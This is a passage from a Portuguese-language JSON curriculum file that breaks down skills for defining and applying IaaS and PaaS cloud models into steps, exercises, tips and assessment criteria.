                            "description": "Explicar a definição de IaaS, destacando que o provedor gerencia hardware e virtualização, enquanto o usuário controla SO, middleware e aplicações.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos da Computação em Nuvem",
                                  "subSteps": [
                                    "Estude a definição geral de Computação em Nuvem segundo padrões como NIST.",
                                    "Identifique os três principais modelos de serviço: IaaS, PaaS e SaaS.",
                                    "Analise as camadas de abstração na nuvem (hardware, virtualização, SO, middleware, aplicações).",
                                    "Revise exemplos de serviços em nuvem para contextualizar."
                                  ],
                                  "verification": "Liste os três modelos de serviço em nuvem e descreva brevemente cada um.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documento NIST sobre Computação em Nuvem (disponível online)",
                                    "Vídeo introdutório no YouTube sobre modelos de nuvem"
                                  ],
                                  "tips": "Foque nas camadas de responsabilidade para preparar a diferenciação do IaaS.",
                                  "learningObjective": "Entender o ecossistema da Computação em Nuvem e posicionar o IaaS nele.",
                                  "commonMistakes": [
                                    "Confundir Computação em Nuvem com virtualização local",
                                    "Ignorar a distinção entre modelos de serviço"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Definir IaaS e Responsabilidades do Provedor",
                                  "subSteps": [
                                    "Leia a definição oficial de IaaS: Infrastructure as a Service.",
                                    "Identifique o que o provedor gerencia: hardware físico, servidores, armazenamento, rede e virtualização.",
                                    "Estude diagramas de pilha de nuvem destacando a camada IaaS.",
                                    "Anote exemplos de provedores como AWS EC2, Google Compute Engine e Azure VMs."
                                  ],
                                  "verification": "Descreva em uma frase o que o provedor gerencia no IaaS.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Página da Wikipedia sobre IaaS",
                                    "Diagrama oficial da AWS sobre responsabilidades em IaaS"
                                  ],
                                  "tips": "Use diagramas visuais para memorizar as camadas gerenciadas pelo provedor.",
                                  "learningObjective": "Dominar a definição precisa de IaaS focando nas responsabilidades do provedor.",
                                  "commonMistakes": [
                                    "Achar que o provedor gerencia o SO",
                                    "Confundir virtualização com o gerenciamento de aplicações"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Entender Responsabilidades do Usuário no IaaS",
                                  "subSteps": [
                                    "Liste o que o usuário controla: Sistema Operacional, middleware, runtime, dados e aplicações.",
                                    "Simule um cenário: provisionar uma VM e instalar SO manualmente.",
                                    "Compare com controle total em data centers on-premise.",
                                    "Pratique descrevendo o fluxo de deployment em IaaS."
                                  ],
                                  "verification": "Explique o que você instalaria em uma VM IaaS recém-provisionada.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Tutorial AWS EC2 'Lançar uma instância'",
                                    "Simulador de console de nuvem gratuito"
                                  ],
                                  "tips": "Pense no IaaS como 'alugar hardware virtualizado' onde você faz tudo acima da hypervisor.",
                                  "learningObjective": "Identificar precisamente o escopo de controle do usuário em IaaS.",
                                  "commonMistakes": [
                                    "Supor que o provedor atualiza o SO automaticamente",
                                    "Subestimar a complexidade de gerenciar middleware"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Diferenciar IaaS de Outros Modelos e Sintetizar",
                                  "subSteps": [
                                    "Compare IaaS vs PaaS: em PaaS, provedor gerencia SO e middleware.",
                                    "Compare IaaS vs SaaS: em SaaS, usuário só usa a aplicação.",
                                    "Crie uma tabela de responsabilidades para os três modelos.",
                                    "Resuma a definição completa de IaaS em suas palavras."
                                  ],
                                  "verification": "Preencha uma tabela comparativa correta dos três modelos.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Tabela comparativa de modelos de nuvem (buscar 'IaaS PaaS SaaS comparison')",
                                    "Quiz online sobre modelos de serviço"
                                  ],
                                  "tips": "Use mnemônicos: IaaS = Infra (base), PaaS = Plataforma (meio), SaaS = Software (topo).",
                                  "learningObjective": "Consolidar a definição de IaaS por meio de comparações claras.",
                                  "commonMistakes": [
                                    "Confundir IaaS com PaaS achando que provedor gerencia apps",
                                    "Ignorar benefícios de cada modelo"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Aplicar e Verificar o Conhecimento",
                                  "subSteps": [
                                    "Crie um diagrama da pilha IaaS com responsabilidades.",
                                    "Responda perguntas: 'O que acontece se o SO crashar em IaaS?'",
                                    "Discuta cenários reais de uso de IaaS.",
                                    "Autoavalie sua explicação gravando um vídeo curto."
                                  ],
                                  "verification": "Seu diagrama cobre todas as camadas e responsabilidades corretamente.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Ferramenta de diagrama como Draw.io",
                                    "Gravação de áudio/vídeo para autoavaliação"
                                  ],
                                  "tips": "Ensine o conceito para outra pessoa para reforçar o aprendizado.",
                                  "learningObjective": "Aplicar a definição de IaaS em contextos práticos e validar compreensão.",
                                  "commonMistakes": [
                                    "Focar só em teoria sem exemplos",
                                    "Generalizar responsabilidades incorretamente"
                                  ]
                                }
                              ],
                              "practicalExample": "Ao usar AWS EC2 (IaaS), você provisiona uma máquina virtual, instala Ubuntu como SO, configura Apache como middleware e deploya sua aplicação web. A AWS gerencia o hardware físico, hypervisor (Nitro) e rede subjacente, mas você resolve atualizações de SO e segurança de apps.",
                              "finalVerifications": [
                                "Explicar a definição de IaaS em 1-2 frases precisas.",
                                "Listar corretamente 5 componentes gerenciados pelo provedor.",
                                "Identificar 4 responsabilidades do usuário.",
                                "Diferenciar IaaS de PaaS e SaaS com exemplos.",
                                "Desenhar um diagrama da pilha de responsabilidades IaaS."
                              ],
                              "assessmentCriteria": [
                                "Precisão na definição (provedor gerencia hardware/virtualização).",
                                "Correta distinção de responsabilidades usuário vs provedor.",
                                "Uso de exemplos reais de provedores.",
                                "Clareza na comparação com PaaS/SaaS.",
                                "Capacidade de sintetizar em diagrama ou tabela."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Configuração de VPCs e networking em IaaS.",
                                "Administração de Sistemas: Gerenciamento de SO e patches em VMs.",
                                "Segurança da Informação: Implementação de firewalls e IAM no nível usuário.",
                                "Economia Empresarial: Análise de custos pay-as-you-go vs CAPEX on-premise.",
                                "Desenvolvimento de Software: Deploy de apps em ambientes IaaS."
                              ],
                              "realWorldApplication": "Startups utilizam IaaS como Google Cloud VMs para escalar infraestrutura dinamicamente durante picos de tráfego, evitando investimentos iniciais em hardware físico, como no caso de empresas de e-commerce no Black Friday."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.1.1.2",
                            "name": "Identificar características do IaaS",
                            "description": "Listar e descrever características como escalabilidade, pagamento por uso, provisionamento sob demanda e exemplos como AWS EC2 ou Google Compute Engine.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a Definição e Visão Geral do IaaS",
                                  "subSteps": [
                                    "Pesquise a definição oficial de Infrastructure as a Service (IaaS) em fontes confiáveis como AWS ou NIST.",
                                    "Identifique a posição do IaaS na pilha de computação em nuvem (abaixo de PaaS e SaaS).",
                                    "Crie um diagrama simples mostrando o que o provedor gerencia vs. o usuário.",
                                    "Anote responsabilidades do usuário em IaaS, como OS e aplicações.",
                                    "Compare brevemente com on-premises para destacar diferenças."
                                  ],
                                  "verification": "Escreva uma definição de IaaS em suas próprias palavras e desenhe um diagrama da pilha de nuvem.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Acesso à internet",
                                    "Ferramenta de desenho (ex: Draw.io ou papel e caneta)",
                                    "Notebook para anotações"
                                  ],
                                  "tips": [
                                    "Use analogias como 'alugar um terreno nu vs. casa pronta' para fixar o conceito.",
                                    "Foque em controle total do usuário."
                                  ],
                                  "learningObjective": "Dominar o conceito básico de IaaS e sua distinção de outros modelos de serviço em nuvem.",
                                  "commonMistakes": [
                                    "Confundir IaaS com PaaS (onde o provedor gerencia mais camadas).",
                                    "Achar que IaaS não requer conhecimento de infraestrutura."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Listar e Descrever Características Principais do IaaS",
                                  "subSteps": [
                                    "Liste as características chave: escalabilidade, provisionamento sob demanda, pagamento por uso, alta disponibilidade.",
                                    "Descreva cada uma: escalabilidade (aumentar/diminuir recursos dinamicamente), provisionamento sob demanda (instanciar em minutos).",
                                    "Explique pagamento por uso (cobrança por segundo/hora de uso real).",
                                    "Pesquise e anote 2-3 características adicionais como elasticidade e gerenciamento de imagens.",
                                    "Crie uma tabela comparativa com definições e benefícios."
                                  ],
                                  "verification": "Complete uma tabela com pelo menos 5 características, descrições e exemplos de benefícios.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Acesso à documentação oficial AWS/Google Cloud",
                                    "Planilha ou documento para tabela"
                                  ],
                                  "tips": [
                                    "Priorize características com exemplos numéricos, como 'escala de 1 para 100 VMs em minutos'.",
                                    "Use bullet points para descrições concisas."
                                  ],
                                  "learningObjective": "Identificar e explicar com precisão as características fundamentais do IaaS.",
                                  "commonMistakes": [
                                    "Omitir benefícios práticos das características.",
                                    "Confundir provisionamento sob demanda com auto-scaling."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Exemplos Práticos de Provedores IaaS",
                                  "subSteps": [
                                    "Estude AWS EC2: provisionamento de VMs, auto-scaling, pay-per-use.",
                                    "Analise Google Compute Engine: instâncias personalizáveis, live migration.",
                                    "Compare com Azure Virtual Machines: integração com outros serviços Azure.",
                                    "Acesse dashboards gratuitos (free tier) e visualize preços/on-demand.",
                                    "Anote como cada exemplo ilustra pelo menos 3 características."
                                  ],
                                  "verification": "Registre screenshots ou notas de 3 provedores mostrando uma característica em ação.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Conta free tier AWS/GCP/Azure",
                                    "Navegador web"
                                  ],
                                  "tips": [
                                    "Use calculadoras de preço para simular cenários pay-per-use.",
                                    "Foque em features gratuitas para prática sem custo."
                                  ],
                                  "learningObjective": "Associar características do IaaS a provedores reais como AWS EC2 e Google Compute Engine.",
                                  "commonMistakes": [
                                    "Ignorar free tiers e assumir custos altos.",
                                    "Não ligar exemplos diretamente às características."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Sintetizar e Aplicar o Conhecimento",
                                  "subSteps": [
                                    "Revise todas as características e exemplos em uma mind map.",
                                    "Crie um quiz pessoal com 5 perguntas sobre IaaS.",
                                    "Discuta em fórum ou com colega: 'Por que escolher IaaS para uma startup?'",
                                    "Identifique cenários onde IaaS é ideal vs. inadequado.",
                                    "Planeje um mini-projeto: listar specs para uma VM fictícia."
                                  ],
                                  "verification": "Responda corretamente a um auto-quiz e crie uma mind map compartilhável.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Ferramenta de mind map (ex: MindMeister)",
                                    "Fórum online opcional"
                                  ],
                                  "tips": [
                                    "Use cores na mind map para agrupar características.",
                                    "Pense em custo-benefício para cenários reais."
                                  ],
                                  "learningObjective": "Integrar o conhecimento para identificar e justificar uso de características do IaaS.",
                                  "commonMistakes": [
                                    "Não revisar erros do quiz.",
                                    "Focar só em teoria sem ligação prática."
                                  ]
                                }
                              ],
                              "practicalExample": "Para hospedar uma aplicação web de e-commerce com tráfego variável, use AWS EC2: provisionar sob demanda 2 VMs iniciais (5 minutos), configurar auto-scaling para adicionar 10 VMs em pico de vendas (escalabilidade), e pagar apenas pelas horas usadas (pay-per-use), economizando 70% vs. servidores fixos.",
                              "finalVerifications": [
                                "Liste corretamente pelo menos 5 características principais do IaaS.",
                                "Descreva provisionamento sob demanda com um exemplo temporal (ex: minutos).",
                                "Cite 3 provedores IaaS e associe cada um a uma característica.",
                                "Explique pagamento por uso com cálculo simples de economia.",
                                "Diferencie IaaS de PaaS em termos de gerenciamento de OS.",
                                "Identifique 2 benefícios de escalabilidade em cenários reais."
                              ],
                              "assessmentCriteria": [
                                "Precisão e completude das descrições de características (90%+ acurácia).",
                                "Profundidade dos sub-steps executados (todos com evidências).",
                                "Correta associação de exemplos reais às características.",
                                "Clareza na verificação e síntese final.",
                                "Demonstração de entendimento via quiz ou mind map.",
                                "Consideração de erros comuns evitados."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Configuração de VPCs e load balancers em IaaS.",
                                "Segurança da Informação: IAM, firewalls e patching em VMs IaaS.",
                                "Gestão de Custos/Economia: Análise de TCO com pay-per-use.",
                                "Desenvolvimento de Software: Deploy de apps em VMs provisionadas.",
                                "Administração de Sistemas: Gerenciamento de OS e storage em nuvem."
                              ],
                              "realWorldApplication": "Empresas como Netflix utilizam IaaS (AWS EC2) para escalar infraestrutura dinamicamente durante eventos globais, provisionando milhares de VMs sob demanda, otimizando custos com pay-per-use e garantindo alta disponibilidade para milhões de usuários."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.1.1.3",
                            "name": "Aplicar IaaS no desenvolvimento de aplicações",
                            "description": "Analisar como IaaS facilita o deployment de aplicações web e móveis, gerenciando infraestrutura para alta disponibilidade e escalabilidade.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Fundamentos de IaaS e Planejar Infraestrutura",
                                  "subSteps": [
                                    "Estude os conceitos chave de IaaS, incluindo virtualização, provisionamento sob demanda e gerenciamento de recursos como VMs, storage e redes.",
                                    "Analise requisitos da aplicação web/móvel: tráfego esperado, necessidade de escalabilidade e disponibilidade.",
                                    "Desenhe um diagrama de arquitetura identificando componentes IaaS necessários (ex: instâncias de computação, load balancers).",
                                    "Compare provedores IaaS (AWS EC2, Azure VMs, Google Compute Engine) com base em custo, features e integração.",
                                    "Defina métricas de performance: latência < 200ms, uptime > 99.9%."
                                  ],
                                  "verification": "Diagrama de arquitetura completo e relatório comparativo de provedores salvo em documento compartilhável.",
                                  "estimatedTime": "4 horas",
                                  "materials": "Documentação oficial de AWS/Azure/GCP, ferramentas de diagramação como Draw.io ou Lucidchart.",
                                  "tips": "Comece com um diagrama simples e refine iterativamente para evitar sobrecarga inicial.",
                                  "learningObjective": "Dominar conceitos de IaaS e planejar infraestrutura alinhada aos requisitos da aplicação.",
                                  "commonMistakes": "Ignorar custos ocultos como transferência de dados ou subestimar picos de tráfego."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Provisionar Recursos IaaS Básicos",
                                  "subSteps": [
                                    "Crie uma conta gratuita em um provedor IaaS (ex: AWS Free Tier).",
                                    "Lance uma instância VM básica configurada com SO compatível (ex: Ubuntu para apps web).",
                                    "Configure rede: VPC, subnets, security groups para permitir tráfego HTTP/HTTPS.",
                                    "Anexe storage (ex: EBS volumes) e configure backups automáticos.",
                                    "Instale dependências básicas via SSH (ex: servidor web Apache/Nginx)."
                                  ],
                                  "verification": "Instância acessível via IP público, servidor web respondendo em porta 80/443.",
                                  "estimatedTime": "3 horas",
                                  "materials": "Conta IaaS ativa, cliente SSH (PuTTY ou terminal), chaves de acesso IAM.",
                                  "tips": "Use templates AMI prontos para acelerar o provisionamento e reduzir erros de configuração.",
                                  "learningObjective": "Provisionar e configurar infraestrutura IaaS de forma segura e eficiente.",
                                  "commonMistakes": "Expor security groups amplamente, permitindo acesso SSH de qualquer IP."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Deployar Aplicação Web/Móvel em IaaS",
                                  "subSteps": [
                                    "Prepare o código da aplicação (ex: app Node.js ou Flask para web, ou backend para mobile).",
                                    "Use CI/CD básico (ex: GitHub Actions ou AWS CodeDeploy) para deploy automatizado.",
                                    "Configure ambiente runtime: instalar runtime, dependências via package manager.",
                                    "Teste deploy manual: clone repo, build e rode aplicação na VM.",
                                    "Integre banco de dados gerenciado (ex: RDS) se aplicável."
                                  ],
                                  "verification": "Aplicação acessível via browser/mobile, logs sem erros críticos.",
                                  "estimatedTime": "5 horas",
                                  "materials": "Repositório Git com código fonte, ferramentas de deploy como Docker (opcional).",
                                  "tips": "Containerize a app com Docker para portabilidade entre ambientes IaaS.",
                                  "learningObjective": "Executar deployment de aplicações em infraestrutura IaaS provisionada.",
                                  "commonMistakes": "Não versionar configurações, levando a inconsistências em deploys futuros."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Configurar Alta Disponibilidade e Escalabilidade",
                                  "subSteps": [
                                    "Implemente load balancer (ex: AWS ELB) distribuindo tráfego entre múltiplas instâncias.",
                                    "Configure auto-scaling groups baseados em métricas CPU > 70% ou requests/seg.",
                                    "Adicione redundância: múltiplas AZs (Availability Zones) e health checks.",
                                    "Habilite monitoramento (ex: CloudWatch) com alertas para downtime.",
                                    "Teste failover: simule falha em uma instância e verifique redirecionamento."
                                  ],
                                  "verification": "Cluster escalando automaticamente sob load simulado (ex: com Apache Bench), uptime mantido.",
                                  "estimatedTime": "6 horas",
                                  "materials": "Ferramentas de load testing (Apache Bench, Locust), console IaaS.",
                                  "tips": "Defina políticas de scaling conservadoras inicialmente para controlar custos.",
                                  "learningObjective": "Gerenciar infraestrutura IaaS para suportar alta disponibilidade e escalabilidade dinâmica.",
                                  "commonMistakes": "Configurar health checks muito agressivos, causando scaling desnecessário."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Monitorar, Otimizar e Documentar",
                                  "subSteps": [
                                    "Configure dashboards de monitoramento com métricas chave (CPU, memória, latência).",
                                    "Analise logs e otimize recursos (ex: rightsizing de instâncias).",
                                    "Implemente atualizações automáticas e patches de segurança.",
                                    "Documente toda a configuração em README ou Terraform scripts.",
                                    "Realize teste de carga final e ajuste thresholds."
                                  ],
                                  "verification": "Dashboard funcional com alertas testados, documentação completa.",
                                  "estimatedTime": "3 horas",
                                  "materials": "Ferramentas de monitoramento nativas (CloudWatch, Azure Monitor), Markdown editor.",
                                  "tips": "Use IaC (Infrastructure as Code) como Terraform desde o início para reproducibilidade.",
                                  "learningObjective": "Otimizar e manter infraestrutura IaaS em produção.",
                                  "commonMistakes": "Negligenciar limpeza de recursos, acumulando custos desnecessários."
                                }
                              ],
                              "practicalExample": "Desenvolva e deploye uma API REST simples em Node.js no AWS EC2: provisionar 2 instâncias em diferentes AZs, configurar ELB e Auto Scaling Group. Simule 1000 requests/seg com Locust; observe escalada automática de 2 para 5 instâncias mantendo latência < 150ms.",
                              "finalVerifications": [
                                "Aplicação responde corretamente sob carga alta sem downtime.",
                                "Auto-scaling ativa/desativa baseado em métricas configuradas.",
                                "Load balancer distribui tráfego uniformemente entre instâncias saudáveis.",
                                "Logs de monitoramento mostram uptime > 99.9% e alertas funcionais.",
                                "Custos mensais estimados abaixo de limite orçado.",
                                "Documentação permite recriar ambiente em < 30min."
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual: explica corretamente benefícios de IaaS para deployment (80%+ acerto em quiz).",
                                "Configuração técnica: todos recursos provisionados sem erros de segurança (verificação manual).",
                                "Performance: app escala para 5x tráfego inicial sem falhas (>95% requests bem-sucedidas).",
                                "Documentação: guia completo e reproduzível (rubrica de clareza 4/5).",
                                "Otimização: rightsizing reduz custos em 20% sem perda de performance.",
                                "Testes: cenários de falha e carga cobertos com evidências."
                              ],
                              "crossCurricularConnections": [
                                "DevOps: Integração com CI/CD pipelines e IaC (Terraform/CloudFormation).",
                                "Segurança da Informação: Configuração de IAM, firewalls e criptografia em trânsito/reposo.",
                                "Desenvolvimento de Software: Deploy de apps web/mobile com microsserviços.",
                                "Gestão de Projetos: Planejamento de custos e SLAs em nuvem.",
                                "Análise de Dados: Uso de métricas para decisões baseadas em dados."
                              ],
                              "realWorldApplication": "Empresas como Netflix usam IaaS (AWS) para deployar streaming global: auto-scaling lida com picos de 200M+ usuários simultâneos, garantindo alta disponibilidade via múltiplas regiões e load balancers, reduzindo custos em 30-50% comparado a data centers próprios."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.1.1.1"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.4.1.2",
                        "name": "Platform as a Service (PaaS)",
                        "description": "Modelo de serviço em nuvem que oferece uma plataforma gerenciada para desenvolvimento e deployment de aplicações, abstraindo infraestrutura e SO.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.1.2.1",
                            "name": "Definir PaaS",
                            "description": "Explicar o que é PaaS, enfatizando que o provedor gerencia runtime, middleware, SO e infraestrutura, focando no código da aplicação.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos da Computação em Nuvem",
                                  "subSteps": [
                                    "Leia uma introdução aos serviços de nuvem (IaaS, PaaS, SaaS).",
                                    "Identifique os benefícios da nuvem: escalabilidade, custo e acessibilidade.",
                                    "Anote as diferenças entre computação tradicional e em nuvem.",
                                    "Assista a um vídeo curto sobre modelos de serviço em nuvem.",
                                    "Resuma em 3 frases o que é computação em nuvem."
                                  ],
                                  "verification": "Crie um mapa mental com os pilares da nuvem e compartilhe com um colega para feedback.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Artigo: 'O que é Cloud Computing?' (AWS ou Azure docs)",
                                    "Vídeo: 'Cloud Computing Explained' no YouTube (5-10 min)"
                                  ],
                                  "tips": [
                                    "Comece com analogias cotidianas, como alugar um carro vs. comprar.",
                                    "Foque em escalabilidade para conectar com PaaS depois."
                                  ],
                                  "learningObjective": "Entender o contexto geral da computação em nuvem como base para modelos de serviço.",
                                  "commonMistakes": [
                                    "Confundir nuvem com mera virtualização de servidores.",
                                    "Ignorar aspectos de gerenciamento de recursos pelo provedor."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar os Três Modelos Principais de Serviço em Nuvem",
                                  "subSteps": [
                                    "Estude definições de IaaS (ex: AWS EC2), PaaS e SaaS (ex: Google Workspace).",
                                    "Crie uma tabela comparativa: responsabilidades do usuário vs. provedor.",
                                    "Desenhe um diagrama de camadas para cada modelo.",
                                    "Pesquise exemplos reais de cada um.",
                                    "Explique verbalmente a progressão de IaaS para SaaS."
                                  ],
                                  "verification": "Preencha uma tabela de comparação e teste com perguntas de autoavaliação.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Infográfico: 'IaaS vs PaaS vs SaaS' (de sites como Gartner ou Red Hat)",
                                    "Página da Wikipedia: Modelos de Serviço em Nuvem"
                                  ],
                                  "tips": [
                                    "Use cores diferentes no diagrama para responsabilidades.",
                                    "Lembre: quanto mais 'aaS', menos o usuário gerencia."
                                  ],
                                  "learningObjective": "Diferenciar IaaS, PaaS e SaaS pelas responsabilidades atribuídas.",
                                  "commonMistakes": [
                                    "Achar que PaaS é só para apps web, ignorando mobile.",
                                    "Confundir middleware em PaaS com ferramentas de devops."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Definir PaaS com Ênfase nas Responsabilidades",
                                  "subSteps": [
                                    "Leia a definição oficial: PaaS fornece runtime, middleware, OS e infraestrutura gerenciados.",
                                    "Liste o que o desenvolvedor foca: apenas código da aplicação.",
                                    "Anote componentes gerenciados: servidores, balanceadores, atualizações de SO.",
                                    "Escreva uma definição em suas palavras enfatizando o foco no código.",
                                    "Compare com um fluxograma: deploy em PaaS vs. servidor local."
                                  ],
                                  "verification": "Escreva uma definição de 100 palavras e valide contra fontes oficiais.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Docs oficiais: Heroku PaaS ou Google App Engine",
                                    "Artigo: 'What is PaaS?' da Microsoft Azure"
                                  ],
                                  "tips": [
                                    "Use a metáfora de 'cozinha pronta': você cozinha, provedor cuida da cozinha.",
                                    "Enfatize 'foco no código' para fixar o conceito chave."
                                  ],
                                  "learningObjective": "Articular precisamente o que PaaS é e o que o provedor gerencia.",
                                  "commonMistakes": [
                                    "Incluir gerenciamento de dados como responsabilidade do usuário em PaaS.",
                                    "Pensar que PaaS elimina todo gerenciamento de dependências."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar e Reforçar o Conceito de PaaS",
                                  "subSteps": [
                                    "Pesquise 3 plataformas PaaS (Heroku, Vercel, AWS Elastic Beanstalk).",
                                    "Simule um deploy simples lendo tutoriais.",
                                    "Discuta cenários: quando escolher PaaS vs. IaaS.",
                                    "Crie flashcards com definição e componentes.",
                                    "Ensine o conceito a alguém como se fosse iniciante."
                                  ],
                                  "verification": "Realize uma apresentação de 2 minutos gravada explicando PaaS.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Tutoriais: 'Deploy to Heroku in 5 min'",
                                    "Ferramenta: Anki para flashcards"
                                  ],
                                  "tips": [
                                    "Escolha plataformas populares para relevância.",
                                    "Pratique ensino para fixar conhecimento."
                                  ],
                                  "learningObjective": "Aplicar a definição de PaaS em contextos práticos e exemplos.",
                                  "commonMistakes": [
                                    "Confundir PaaS com serverless (FaaS é um subconjunto).",
                                    "Subestimar limites de PaaS em customizações avançadas."
                                  ]
                                }
                              ],
                              "practicalExample": "Para lançar um blog em Node.js, use Heroku (PaaS): escreva o código, instale dependências via package.json, faça git push para Heroku. O provedor gerencia o servidor Node runtime, middleware (Express), SO Ubuntu atualizado e infraestrutura escalável automaticamente. Você foca só no código do blog, sem configurar VMs ou bancos.",
                              "finalVerifications": [
                                "Explique PaaS em 1 minuto sem notas, cobrindo runtime, middleware, OS e foco no código.",
                                "Liste 4 componentes gerenciados pelo provedor em PaaS.",
                                "Diferencie PaaS de IaaS e SaaS em uma tabela rápida.",
                                "Identifique PaaS em 3 exemplos reais (Heroku, App Engine, Netlify).",
                                "Responda corretamente a 5 perguntas de quiz sobre definição.",
                                "Crie um fluxograma de responsabilidades em PaaS."
                              ],
                              "assessmentCriteria": [
                                "Definição precisa: menciona gerenciamento de runtime, middleware, OS e infraestrutura.",
                                "Ênfase correta no foco do desenvolvedor apenas no código da aplicação.",
                                "Comparação clara com IaaS (mais gerenciamento) e SaaS (menos controle).",
                                "Uso de exemplos concretos e linguagem acessível.",
                                "Ausência de confusões comuns, como equiparar PaaS a serverless.",
                                "Capacidade de explicar verbalmente com confiança."
                              ],
                              "crossCurricularConnections": [
                                "Desenvolvimento de Software: Facilita deploy e CI/CD pipelines.",
                                "Administração de Sistemas: Reduz tarefas de sysadmin para foco em apps.",
                                "Gestão de Projetos/Negócios: Acelera time-to-market e reduz custos OPEX.",
                                "Segurança da Informação: Provedor gerencia patches de segurança.",
                                "Engenharia de Software: Promove DevOps com auto-scaling."
                              ],
                              "realWorldApplication": "Startups como Shopify usam PaaS (ex: AWS Elastic Beanstalk) para deploy rápido de e-commerces escaláveis, permitindo que equipes de dev foquem em features de usuário sem gerenciar servidores, economizando tempo e permitindo crescimento de milhares de usuários sem downtime."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.1.2.2",
                            "name": "Identificar características do PaaS",
                            "description": "Descrever características como desenvolvimento acelerado, auto-scaling automático, integração de bancos de dados e exemplos como Heroku ou Azure App Service.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o conceito básico de PaaS",
                                  "subSteps": [
                                    "Pesquise a definição oficial de PaaS em fontes confiáveis como documentações da AWS, Google Cloud ou Microsoft Azure.",
                                    "Identifique a posição do PaaS na stack de computação em nuvem (comparado a IaaS e SaaS).",
                                    "Anote as responsabilidades principais do provedor PaaS versus o desenvolvedor.",
                                    "Crie um diagrama simples ilustrando o modelo PaaS.",
                                    "Revise exemplos iniciais como Heroku e Azure App Service."
                                  ],
                                  "verification": "Escreva uma definição de PaaS em 2-3 frases e compare com fontes oficiais.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação oficial: AWS Elastic Beanstalk, Google App Engine, Heroku Docs",
                                    "Vídeo introdutório: 'O que é PaaS?' no YouTube (canais como freeCodeCamp ou AWS Training)"
                                  ],
                                  "tips": [
                                    "Use analogias: PaaS é como alugar um apartamento mobiliado (infra pronta para código).",
                                    "Foque na abstração de infraestrutura para acelerar desenvolvimento."
                                  ],
                                  "learningObjective": "Definir PaaS e sua diferenciação de outros modelos de nuvem.",
                                  "commonMistakes": [
                                    "Confundir PaaS com SaaS (PaaS permite customização de código).",
                                    "Achar que PaaS elimina toda gestão (ainda gerencia app e dados)."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar e descrever características principais do PaaS",
                                  "subSteps": [
                                    "Liste pelo menos 5 características chave: desenvolvimento acelerado, auto-scaling, integração de DB, middleware gerenciado, deploy contínuo.",
                                    "Descreva cada uma com 1-2 frases, incluindo benefícios.",
                                    "Pesquise evidências reais em plataformas PaaS.",
                                    "Crie uma tabela comparativa: Característica | Descrição | Benefício.",
                                    "Priorize auto-scaling e integração de serviços."
                                  ],
                                  "verification": "Apresente uma lista com 5+ características descritas corretamente.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Sites: Heroku Features, Azure App Service Overview",
                                    "Ferramenta: Google Docs ou Notion para tabela"
                                  ],
                                  "tips": [
                                    "Pense em cenários: 'Como PaaS lida com pico de tráfego?'",
                                    "Use termos técnicos corretos como 'horizontal scaling'."
                                  ],
                                  "learningObjective": "Listar e explicar com precisão as características centrais do PaaS.",
                                  "commonMistakes": [
                                    "Ignorar custos ocultos como limites de scaling.",
                                    "Generalizar todas as plataformas PaaS como idênticas."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar exemplos práticos de PaaS",
                                  "subSteps": [
                                    "Analise Heroku: deploy via Git, add-ons para DB (PostgreSQL).",
                                    "Analise Azure App Service: suporte multi-linguagem, auto-scale rules.",
